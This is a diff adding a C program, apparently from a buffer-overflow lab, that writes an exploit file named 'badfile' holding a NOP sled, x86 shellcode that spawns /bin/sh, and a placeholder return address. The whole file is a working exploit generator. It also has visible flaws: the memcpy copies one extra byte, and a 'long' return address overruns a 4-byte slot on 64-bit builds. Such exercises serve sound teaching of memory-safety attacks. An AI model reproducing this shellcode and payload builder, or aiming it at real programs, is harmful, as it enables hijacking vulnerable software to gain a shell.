@@ -1,0 +1,71 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define NOP_SIZE 82        // Size of the NOP sled
+#define NOP 0x90
+#define SHELLCODE_SIZE 23  // Length of shellcode
+#define RET_SIZE 4         // Size of return address (4 bytes)
+#define TARGET_FILE "badfile"
+
+// Shellcode to spawn a shell (/bin/sh)
+unsigned char shellcode[] =
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+    "\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+void create_badfile(char *filename, long return_address) {
+    int total_size = NOP_SIZE + SHELLCODE_SIZE + RET_SIZE; // Total buffer size
+    long *ret_addr;
+    FILE *badfile;
+    char buffer[total_size];  // Combined buffer
+
+    // Initialize the entire buffer with NOP sled
+    memset(buffer, NOP, NOP_SIZE);
+
+    // Copy the shellcode into the buffer right after the NOP sled
+    memcpy(buffer + NOP_SIZE, shellcode, sizeof(shellcode));
+
+    // Place the return address at the end of the buffer
+    ret_addr = (long *)(buffer + NOP_SIZE + SHELLCODE_SIZE);
+    *ret_addr = return_address;
+
+    // Write the buffer to the target file
+    badfile = fopen(filename, "w");
+    if (badfile == NULL) {
+        perror("Error opening target file");
+        exit(EXIT_FAILURE);
+    }
+
+    if (fwrite(buffer, total_size, 1, badfile) != 1) {
+        perror("Error writing to target file");
+        fclose(badfile);
+        exit(EXIT_FAILURE);
+    }
+
+    fclose(badfile);
+    printf("Exploit file written successfully: %s\n", filename);
+}
+
+long find_return_address() {
+    // In a real-world scenario, this would involve techniques like:
+    // - Using a debugger (gdb) to identify the return address.
+    // - Using pattern matching tools like cyclic patterns to identify buffer overflow locations.
+    // 
+    // For now, we simulate it with a hardcoded address. Adjust based on your environment.
+
+    long ret_address = 0xdeadbeef;  // Placeholder return address (to be discovered dynamically)
+    return ret_address;
+}
+
+int main() {
+    long return_address;
+
+    // Find the correct return address dynamically (can be done using gdb, or other debugging tools)
+    return_address = find_return_address();
+
+    // Create the badfile with the calculated return address
+    create_badfile(TARGET_FILE, return_address);
+
+    return 0;
+}
